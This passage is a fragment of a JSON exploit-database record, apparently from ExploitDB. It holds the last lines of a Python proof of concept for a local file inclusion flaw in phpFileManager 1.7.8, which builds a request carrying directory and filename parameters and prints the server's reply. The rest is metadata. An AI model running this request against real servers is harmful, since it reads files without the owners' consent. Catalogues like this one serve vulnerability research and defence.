ip_add + \"index.php?action=3&fm_current_dir=\" + dr + \"&filename=\" + fd +\"\")\r\nprint exp.text", "description": "phpFileManager 1.7.8 - Local File Inclusion", "author": "Murat Kalafatoglu", "_id": 46638, "source": "ExploitDB", "platform": "php", "date": "2019-04-02T00:00:00+00:00", "cve": [], "type": "webapps", "port": 0}], "total": 1368}